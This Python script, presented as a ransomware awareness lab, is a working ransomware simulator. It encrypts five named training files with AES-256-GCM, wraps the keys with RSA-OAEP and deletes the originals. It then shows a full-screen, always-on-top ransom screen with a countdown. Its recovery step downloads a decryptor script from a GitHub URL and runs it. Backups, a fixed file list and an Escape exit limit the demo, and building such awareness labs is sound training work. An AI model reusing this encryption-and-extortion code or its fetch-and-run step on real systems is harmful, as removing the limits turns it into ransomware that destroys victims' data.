from pathlib import Path
from datetime import datetime, timedelta

import hashlib
import json
import os
import shutil
import subprocess
import sys
import tkinter as tk
import time

from urllib.request import Request, urlopen

from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Hash import SHA256
from Cryptodome.Random import get_random_bytes

try:
    from PIL import Image, ImageTk
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False


# ============================================================
# CONTROLLED RANSOMWARE AWARENESS LAB
#
# Only these exact training files are processed:
#
# ~/Desktop/RansomDemo/targets/
#
# No recursive filesystem scan.
# No persistence.
# No network-share access.
# No system-file access.
# ============================================================


ROOT = (
    Path.home()
    / "Desktop"
    / "RansomDemo"
)

TARGET_DIR = (
    ROOT
    / "targets"
)

BACKUP_DIR = (
    ROOT
    / ".safety_backup"
)

RUNTIME_DIR = (
    ROOT
    / ".runtime"
)

LOG_FILE = (
    ROOT
    / "demo_log.txt"
)

CHECKSUM_FILE = (
    ROOT
    / "checksums.json"
)

PRIVATE_KEY_FILE = (
    RUNTIME_DIR
    / "private.pem"
)

PUBLIC_KEY_FILE = (
    RUNTIME_DIR
    / "public.pem"
)

DECRYPTOR_FILE = (
    RUNTIME_DIR
    / "demo_decrypt.py"
)

MASCOT_IMAGE_FILE = (
    ROOT
    / "unt_mascot.png"
)


# ============================================================
# GITHUB
# ============================================================


DECRYPTOR_URL = (
    "https://raw.githubusercontent.com/"
    "what0302/what0302.github.io/"
    "master/_posts/demo_decrypt.py"
)

RECOVERY_CODE_URL = (
    "https://raw.githubusercontent.com/"
    "what0302/what0302.github.io/"
    "master/_posts/recovery_code.txt"
)


# ============================================================
# TARGET FILES
# ============================================================


TARGET_FILES = [
    "personal_notes.txt",
    "employees.csv",
    "config.json",
    "project_plan.md",
    "application.log",
]


MAGIC = b"UNTDEMO1"

COUNTDOWN_MINUTES = 30


# ============================================================
# COLORS
# ============================================================


BG = "#8b0000"
BG_DARK = "#650000"
PANEL = "#151515"
PANEL_2 = "#222222"

WHITE = "#ffffff"
YELLOW = "#ffe600"
RED = "#ff3030"
GRAY = "#bbbbbb"
GREEN = "#45d36b"


# ============================================================
# LOGGING
# ============================================================


def write_log(message):

    ROOT.mkdir(
        parents=True,
        exist_ok=True
    )

    timestamp = datetime.now().strftime(
        "%Y-%m-%d %H:%M:%S"
    )

    line = (
        f"{timestamp} "
        f"{message}"
    )

    print(line)

    with LOG_FILE.open(
        "a",
        encoding="utf-8"
    ) as file:

        file.write(
            line + "\n"
        )


# ============================================================
# SHA-256
# ============================================================


def sha256_file(path):

    digest = hashlib.sha256()

    with path.open("rb") as file:

        while True:

            chunk = file.read(
                1024 * 1024
            )

            if not chunk:
                break

            digest.update(chunk)

    return digest.hexdigest()


# ============================================================
# DIRECTORY SETUP
# ============================================================


def setup():

    TARGET_DIR.mkdir(
        parents=True,
        exist_ok=True
    )

    BACKUP_DIR.mkdir(
        parents=True,
        exist_ok=True
    )

    RUNTIME_DIR.mkdir(
        parents=True,
        exist_ok=True
    )


# ============================================================
# RSA KEY GENERATION
# ============================================================


def generate_keys():

    if PRIVATE_KEY_FILE.exists():

        private_key = RSA.import_key(
            PRIVATE_KEY_FILE.read_bytes()
        )

        if not PUBLIC_KEY_FILE.exists():

            PUBLIC_KEY_FILE.write_bytes(
                private_key
                .publickey()
                .export_key()
            )

        write_log(
            "[KEY] Existing RSA key pair loaded"
        )

        return

    write_log(
        "[KEY] Generating RSA-2048 training key pair"
    )

    key = RSA.generate(
        2048
    )

    PRIVATE_KEY_FILE.write_bytes(
        key.export_key()
    )

    PUBLIC_KEY_FILE.write_bytes(
        key
        .publickey()
        .export_key()
    )

    try:

        os.chmod(
            PRIVATE_KEY_FILE,
            0o600
        )

    except OSError:

        pass

    write_log(
        "[KEY] RSA key pair generated"
    )


# ============================================================
# SHA-256 BASELINE
# ============================================================


def save_original_checksums():

    checksums = {}

    for filename in TARGET_FILES:

        path = (
            TARGET_DIR
            / filename
        )

        if not path.exists():

            write_log(
                "[HASH-ERROR] "
                f"Missing source file: {filename}"
            )

            continue

        if path.is_symlink():

            write_log(
                "[HASH-ERROR] "
                f"Symlink rejected: {filename}"
            )

            continue

        digest = sha256_file(
            path
        )

        checksums[
            filename
        ] = digest

        write_log(
            "[HASH-BEFORE] "
            f"{filename} "
            f"{digest}"
        )

    CHECKSUM_FILE.write_text(
        json.dumps(
            checksums,
            indent=2
        ),
        encoding="utf-8"
    )

    write_log(
        "[HASH] SHA-256 baseline saved"
    )


# ============================================================
# ENCRYPT FILE
# ============================================================


def encrypt_file(filename):

    source = (
        TARGET_DIR
        / filename
    )

    encrypted = (
        TARGET_DIR
        / (filename + ".unt")
    )

    backup = (
        BACKUP_DIR
        / filename
    )

    temporary = (
        TARGET_DIR
        / (filename + ".unt.tmp")
    )

    # --------------------------------------------------------
    # SAFETY
    # --------------------------------------------------------

    if source.is_symlink():

        write_log(
            "[SKIP] "
            f"Symlink rejected: {filename}"
        )

        return False

    if not source.exists():

        if encrypted.exists():

            write_log(
                "[INFO] "
                f"Already encrypted: {filename}"
            )

            return True

        write_log(
            "[ERROR] "
            f"Source missing: {filename}"
        )

        return False

    if encrypted.exists():

        write_log(
            "[ERROR] "
            f"Original and .unt both exist: {filename}"
        )

        return False

    # --------------------------------------------------------
    # SAFETY BACKUP
    # --------------------------------------------------------

    if not backup.exists():

        shutil.copy2(
            source,
            backup
        )

        write_log(
            "[BACKUP] "
            f"{filename}"
        )

    # --------------------------------------------------------
    # READ PLAINTEXT
    # --------------------------------------------------------

    plaintext = (
        source.read_bytes()
    )

    # --------------------------------------------------------
    # RSA PUBLIC KEY
    # --------------------------------------------------------

    public_key = RSA.import_key(
        PUBLIC_KEY_FILE.read_bytes()
    )

    # --------------------------------------------------------
    # RANDOM AES-256 KEY
    # --------------------------------------------------------

    aes_key = get_random_bytes(
        32
    )

    # --------------------------------------------------------
    # AES-GCM
    # --------------------------------------------------------

    aes_cipher = AES.new(
        aes_key,
        AES.MODE_GCM
    )

    ciphertext, tag = (
        aes_cipher.encrypt_and_digest(
            plaintext
        )
    )

    # --------------------------------------------------------
    # RSA-OAEP WRAP AES KEY
    # --------------------------------------------------------

    rsa_cipher = PKCS1_OAEP.new(
        public_key,
        hashAlgo=SHA256
    )

    encrypted_aes_key = (
        rsa_cipher.encrypt(
            aes_key
        )
    )

    try:

        with temporary.open(
            "wb"
        ) as file:

            file.write(
                MAGIC
            )

            file.write(
                len(
                    encrypted_aes_key
                ).to_bytes(
                    2,
                    "big"
                )
            )

            file.write(
                encrypted_aes_key
            )

            file.write(
                len(
                    aes_cipher.nonce
                ).to_bytes(
                    1,
                    "big"
                )
            )

            file.write(
                aes_cipher.nonce
            )

            file.write(
                len(tag).to_bytes(
                    1,
                    "big"
                )
            )

            file.write(
                tag
            )

            file.write(
                ciphertext
            )

        os.replace(
            temporary,
            encrypted
        )

        source.unlink()

        write_log(
            "[ENCRYPTED] "
            f"{filename} -> "
            f"{filename}.unt"
        )

        return True

    except Exception as error:

        if temporary.exists():

            temporary.unlink()

        write_log(
            "[ENCRYPT-FAILED] "
            f"{filename}: "
            f"{error}"
        )

        return False


# ============================================================
# ENCRYPT ALL
# ============================================================


def encrypt_all():

    successful = 0

    for filename in TARGET_FILES:

        if encrypt_file(
            filename
        ):

            successful += 1

    return successful


# ============================================================
# VERIFY ENCRYPTION
# ============================================================


def verify_encrypted_state():

    for filename in TARGET_FILES:

        original = (
            TARGET_DIR
            / filename
        )

        encrypted = (
            TARGET_DIR
            / (filename + ".unt")
        )

        if original.exists():

            write_log(
                "[VERIFY-ERROR] "
                f"Plaintext remains: {filename}"
            )

            return False

        if not encrypted.exists():

            write_log(
                "[VERIFY-ERROR] "
                f"Encrypted file missing: "
                f"{filename}.unt"
            )

            return False

    write_log(
        "[VERIFY] "
        "All 5 training files encrypted"
    )

    return True


# ============================================================
# REMOTE RECOVERY CODE
# ============================================================


def get_remote_recovery_code():

    url = (
        RECOVERY_CODE_URL
        + "?t="
        + str(
            int(
                time.time()
            )
        )
    )

    request = Request(
        url,
        headers={
            "User-Agent":
                "Security-Awareness-Lab/1.0",

            "Cache-Control":
                "no-cache",

            "Pragma":
                "no-cache",
        }
    )

    with urlopen(
        request,
        timeout=10
    ) as response:

        raw = response.read()

    code = (
        raw
        .decode(
            "utf-8"
        )
        .strip()
    )

    if not code:

        raise RuntimeError(
            "Remote recovery code is empty"
        )

    if len(code) > 64:

        raise RuntimeError(
            "Remote recovery code is invalid"
        )

    write_log(
        "[RECOVERY] "
        "Remote recovery code retrieved"
    )

    return code


# ============================================================
# DOWNLOAD DECRYPTOR
# ============================================================


def download_decryptor():

    write_log(
        "[RECOVERY] "
        "Downloading recovery utility"
    )

    url = (
        DECRYPTOR_URL
        + "?t="
        + str(
            int(
                time.time()
            )
        )
    )

    request = Request(
        url,
        headers={
            "User-Agent":
                "Security-Awareness-Lab/1.0",

            "Cache-Control":
                "no-cache",

            "Pragma":
                "no-cache",
        }
    )

    with urlopen(
        request,
        timeout=15
    ) as response:

        data = response.read()

    if len(data) < 100:

        raise RuntimeError(
            "Downloaded recovery utility "
            "is unexpectedly small"
        )

    temporary = (
        RUNTIME_DIR
        / "demo_decrypt.py.tmp"
    )

    temporary.write_bytes(
        data
    )

    os.replace(
        temporary,
        DECRYPTOR_FILE
    )

    write_log(
        "[RECOVERY] "
        "Recovery utility downloaded"
    )


# ============================================================
# MASCOT IMAGE
# ============================================================


def load_mascot_photo():

    if not PIL_AVAILABLE:

        write_log(
            "[GUI-WARNING] "
            "Pillow not installed"
        )

        return None

    if not MASCOT_IMAGE_FILE.exists():

        write_log(
            "[GUI-WARNING] "
            "Mascot image not found"
        )

        return None

    try:

        image = Image.open(
            MASCOT_IMAGE_FILE
        ).convert(
            "RGBA"
        )

        pixels = []

        for r, g, b, a in image.getdata():

            # Remove almost-black background
            if (
                r < 35
                and g < 35
                and b < 35
            ):

                pixels.append(
                    (0, 0, 0, 0)
                )

            else:

                pixels.append(
                    (r, g, b, a)
                )

        image.putdata(
            pixels
        )

        bbox = image.getbbox()

        if bbox:

            image = image.crop(
                bbox
            )

        # Bigger mascot
        image.thumbnail(
            (470, 650)
        )

        return ImageTk.PhotoImage(
            image
        )

    except Exception as error:

        write_log(
            "[GUI-WARNING] "
            f"Mascot load failed: {error}"
        )

        return None


# ============================================================
# GUI
# ============================================================


def show_warning_window():

    root = tk.Tk()

    root.title(
        "Ransomware Simulation"
    )

    root.configure(
        bg=BG
    )

    root.attributes(
        "-fullscreen",
        True
    )

    root.attributes(
        "-topmost",
        True
    )

    root.bind(
        "<Escape>",
        lambda event:
            root.destroy()
    )

    end_time = (
        datetime.now()
        + timedelta(
            minutes=COUNTDOWN_MINUTES
        )
    )

    # ========================================================
    # BACKGROUND
    # ========================================================

    canvas = tk.Canvas(
        root,
        bg=BG,
        highlightthickness=0
    )

    canvas.place(
        x=0,
        y=0,
        relwidth=1,
        relheight=1
    )

    # faint warning pattern
    for y in range(
        100,
        1000,
        180
    ):

        for x in range(
            100,
            1900,
            320
        ):

            canvas.create_text(
                x,
                y,
                text="⚠",
                fill="#780000",
                font=(
                    "Arial",
                    75,
                    "bold"
                )
            )

    # ========================================================
    # MAIN FRAME
    # ========================================================

    main_frame = tk.Frame(
        root,
        bg=BG
    )

    main_frame.place(
        relx=0.5,
        rely=0.53,
        anchor="center"
    )

    # ========================================================
    # LEFT SIDE
    # ========================================================

    left_frame = tk.Frame(
        main_frame,
        bg=BG
    )

    left_frame.grid(
        row=0,
        column=0,
        padx=(20, 55),
        sticky="n"
    )

    mascot_photo = (
        load_mascot_photo()
    )

    if mascot_photo:

        mascot = tk.Label(
            left_frame,
            image=mascot_photo,
            bg=BG,
            bd=0
        )

        mascot.image = (
            mascot_photo
        )

        mascot.pack(
            pady=(40, 10)
        )

    else:

        fallback = tk.Label(
            left_frame,
            text="UNT",
            font=(
                "Arial",
                80,
                "bold"
            ),
            fg=WHITE,
            bg=BG
        )

        fallback.pack(
            pady=120
        )

    # ========================================================
    # RIGHT SIDE
    # ========================================================

    right_frame = tk.Frame(
        main_frame,
        bg=BG
    )

    right_frame.grid(
        row=0,
        column=1,
        sticky="n"
    )

    # ========================================================
    # TITLE
    # ========================================================

    title = tk.Label(
        right_frame,
        text=(
            "RANSOMWARE INFECTION"
        ),
        font=(
            "Arial",
            38,
            "bold"
        ),
        fg=WHITE,
        bg=BG
    )

    title.pack(
        pady=(10, 6)
    )

    encrypted_message = tk.Label(
        right_frame,
        text=(
            "YOUR FILES HAVE BEEN ENCRYPTED"
        ),
        font=(
            "Arial",
            22,
            "bold"
        ),
        fg=YELLOW,
        bg=BG
    )

    encrypted_message.pack(
        pady=4
    )

    test_notice = tk.Label(
        right_frame,
        text=(
            "THIS IS A CONTROLLED TEST."
        ),
        font=(
            "Arial",
            13
        ),
        fg=WHITE,
        bg=BG
    )

    test_notice.pack(
        pady=(3, 10)
    )

    # ========================================================
    # DEMO PAYMENT PANEL
    # ========================================================

    payment_panel = tk.Frame(
        right_frame,
        bg=PANEL,
        bd=2,
        relief="solid"
    )

    payment_panel.pack(
        fill="x",
        pady=(8, 14),
        padx=35
    )

    payment_title = tk.Label(
        payment_panel,
        text=(
            "DEMO PAYMENT INFORMATION"
        ),
        font=(
            "Arial",
            12,
            "bold"
        ),
        fg=RED,
        bg=PANEL
    )

    payment_title.pack(
        pady=(10, 3)
    )

    payment_warning = tk.Label(
        payment_panel,
        text=(
            "TRAINING ONLY — NO PAYMENT IS REQUIRED"
        ),
        font=(
            "Arial",
            11,
            "bold"
        ),
        fg=YELLOW,
        bg=PANEL
    )

    payment_warning.pack(
        pady=2
    )

    fake_wallet = tk.Label(
        payment_panel,
        text=(
            "DEMO BTC ADDRESS: "
            "TEST-ONLY-NOT-A-REAL-ADDRESS"
        ),
        font=(
            "Courier",
            10
        ),
        fg=GRAY,
        bg=PANEL
    )

    fake_wallet.pack(
        pady=(3, 10)
    )

    # ========================================================
    # COUNTDOWN BOX
    # ========================================================

    timer_outer = tk.Frame(
        right_frame,
        bg=RED,
        padx=2,
        pady=2
    )

    timer_outer.pack(
        pady=(2, 16)
    )

    timer_inner = tk.Frame(
        timer_outer,
        bg=PANEL,
        padx=35,
        pady=12
    )

    timer_inner.pack()

    timer_caption = tk.Label(
        timer_inner,
        text="TIME REMAINING",
        font=(
            "Arial",
            12,
            "bold"
        ),
        fg=WHITE,
        bg=PANEL
    )

    timer_caption.pack()

    timer_label = tk.Label(
        timer_inner,
        text="00:30:00",
        font=(
            "Courier",
            48,
            "bold"
        ),
        fg=YELLOW,
        bg=PANEL
    )

    timer_label.pack()

    # ========================================================
    # VIEW FILES
    # ========================================================

    def view_files():

        write_log(
            "[GUI] "
            "Encrypted files directory opened"
        )

        root.attributes(
            "-topmost",
            False
        )

        try:

            subprocess.Popen(
                [
                    "xdg-open",
                    str(
                        TARGET_DIR
                    )
                ]
            )

        except Exception as error:

            write_log(
                "[GUI-ERROR] "
                f"{error}"
            )

    view_button = tk.Button(
        right_frame,
        text="VIEW ENCRYPTED FILES",
        font=(
            "Arial",
            13,
            "bold"
        ),
        command=view_files,
        fg=WHITE,
        bg=PANEL_2,
        activeforeground=WHITE,
        activebackground="#333333",
        bd=1,
        relief="solid",
        cursor="hand2",
        padx=28,
        pady=8
    )

    view_button.pack(
        pady=(0, 12)
    )

    # ========================================================
    # RECOVERY PANEL
    # ========================================================

    recovery_panel = tk.Frame(
        right_frame,
        bg=PANEL,
        padx=30,
        pady=16,
        bd=1,
        relief="solid"
    )

    recovery_panel.pack(
        padx=30,
        pady=5,
        fill="x"
    )

    code_label = tk.Label(
        recovery_panel,
        text="RECOVERY CODE",
        font=(
            "Arial",
            13,
            "bold"
        ),
        fg=WHITE,
        bg=PANEL
    )

    code_label.pack(
        pady=(0, 5)
    )

    code_entry = tk.Entry(
        recovery_panel,
        font=(
            "Courier",
            20,
            "bold"
        ),
        width=18,
        justify="center",
        show="*",
        fg=WHITE,
        bg="#050505",
        insertbackground=WHITE,
        relief="solid",
        bd=2
    )

    code_entry.pack(
        ipady=6,
        pady=3
    )

    code_entry.focus_set()

    status_label = tk.Label(
        recovery_panel,
        text="",
        font=(
            "Arial",
            11,
            "bold"
        ),
        fg=YELLOW,
        bg=PANEL
    )

    status_label.pack(
        pady=6
    )

    # ========================================================
    # RECOVERY LOGIC
    # ========================================================

    def recover():

        entered_code = (
            code_entry
            .get()
            .strip()
        )

        if not entered_code:

            status_label.config(
                text=(
                    "ENTER A RECOVERY CODE"
                )
            )

            return

        status_label.config(
            text=(
                "VALIDATING RECOVERY CODE..."
            )
        )

        root.update_idletasks()

        write_log(
            "[RECOVERY] "
            "Recovery code validation requested"
        )

        try:

            remote_code = (
                get_remote_recovery_code()
            )

        except Exception as error:

            write_log(
                "[RECOVERY-ERROR] "
                f"Unable to retrieve remote code: "
                f"{error}"
            )

            status_label.config(
                text=(
                    "UNABLE TO CONTACT "
                    "RECOVERY SERVER"
                )
            )

            return

        if entered_code != remote_code:

            write_log(
                "[RECOVERY] "
                "Invalid recovery code entered"
            )

            status_label.config(
                text=(
                    "INVALID RECOVERY CODE"
                )
            )

            code_entry.delete(
                0,
                tk.END
            )

            return

        write_log(
            "[RECOVERY] "
            "Remote recovery code validated"
        )

        status_label.config(
            text=(
                "RECOVERY CODE ACCEPTED"
            )
        )

        root.update_idletasks()

        try:

            status_label.config(
                text=(
                    "DOWNLOADING "
                    "RECOVERY UTILITY..."
                )
            )

            root.update_idletasks()

            download_decryptor()

            status_label.config(
                text=(
                    "STARTING FILE RECOVERY..."
                )
            )

            root.update_idletasks()

            subprocess.Popen(
                [
                    sys.executable,
                    str(
                        DECRYPTOR_FILE
                    )
                ]
            )

            write_log(
                "[RECOVERY] "
                "Recovery utility launched"
            )

            root.destroy()

        except Exception as error:

            write_log(
                "[RECOVERY-ERROR] "
                f"{error}"
            )

            status_label.config(
                text=(
                    "RECOVERY FAILED: "
                    + str(error)
                )
            )

    recover_button = tk.Button(
        recovery_panel,
        text="RECOVER FILES",
        font=(
            "Arial",
            14,
            "bold"
        ),
        command=recover,
        fg=WHITE,
        bg="#5d0000",
        activeforeground=WHITE,
        activebackground="#750000",
        bd=1,
        relief="solid",
        cursor="hand2",
        padx=30,
        pady=8
    )

    recover_button.pack(
        pady=(5, 0)
    )

    code_entry.bind(
        "<Return>",
        lambda event:
            recover()
    )

    # ========================================================
    # FOOTER
    # ========================================================

    footer = tk.Label(
        root,
        text=(
            "SIMULATION ONLY"
            "   •   "
            "ESC = Emergency Exit"
        ),
        font=(
            "Arial",
            12
        ),
        fg=WHITE,
        bg=BG
    )

    footer.pack(
        side="bottom",
        pady=18
    )

    # ========================================================
    # COUNTDOWN
    # ========================================================

    def update_timer():

        remaining = (
            end_time
            - datetime.now()
        )

        seconds = max(
            0,
            int(
                remaining.total_seconds()
            )
        )

        hours = (
            seconds // 3600
        )

        minutes = (
            seconds % 3600
        ) // 60

        seconds_remaining = (
            seconds % 60
        )

        timer_label.config(
            text=(
                f"{hours:02d}:"
                f"{minutes:02d}:"
                f"{seconds_remaining:02d}"
            )
        )

        if seconds > 0:

            root.after(
                1000,
                update_timer
            )

        else:

            status_label.config(
                text=(
                    "TRAINING TIMER EXPIRED"
                )
            )

            write_log(
                "[GUI] "
                "Training countdown expired"
            )

    update_timer()

    write_log(
        "[GUI] "
        "Warning screen displayed"
    )

    root.mainloop()


# ============================================================
# MAIN
# ============================================================


def main():

    setup()

    write_log(
        "=================================================="
    )

    write_log(
        "[START] "
        "Ransomware awareness simulation started"
    )

    # --------------------------------------------------------
    # CHECK REQUIRED FILES
    # --------------------------------------------------------

    missing = []

    for filename in TARGET_FILES:

        plaintext = (
            TARGET_DIR
            / filename
        )

        encrypted = (
            TARGET_DIR
            / (filename + ".unt")
        )

        if (
            not plaintext.exists()
            and
            not encrypted.exists()
        ):

            missing.append(
                filename
            )

    if missing:

        write_log(
            "[ABORT] "
            "Required training files missing: "
            + ", ".join(
                missing
            )
        )

        print()

        print(
            "Required training files are missing:"
        )

        for filename in missing:

            print(
                f" - {filename}"
            )

        return

    # --------------------------------------------------------
    # RSA
    # --------------------------------------------------------

    generate_keys()

    # --------------------------------------------------------
    # HASH BASELINE
    # --------------------------------------------------------

    plaintext_count = sum(

        1

        for filename
        in TARGET_FILES

        if (
            TARGET_DIR
            / filename
        ).exists()

    )

    if plaintext_count > 0:

        save_original_checksums()

    # --------------------------------------------------------
    # ENCRYPT
    # --------------------------------------------------------

    successful = (
        encrypt_all()
    )

    write_log(
        "[STATUS] "
        f"Encryption status: "
        f"{successful}/"
        f"{len(TARGET_FILES)}"
    )

    # --------------------------------------------------------
    # VERIFY
    # --------------------------------------------------------

    if not verify_encrypted_state():

        write_log(
            "[ABORT] "
            "Encrypted state verification failed"
        )

        print()

        print(
            "Not all training files "
            "were encrypted."
        )

        print(
            "Warning GUI will not "
            "be displayed."
        )

        return

    # --------------------------------------------------------
    # GUI
    # --------------------------------------------------------

    show_warning_window()


if __name__ == "__main__":

    main()
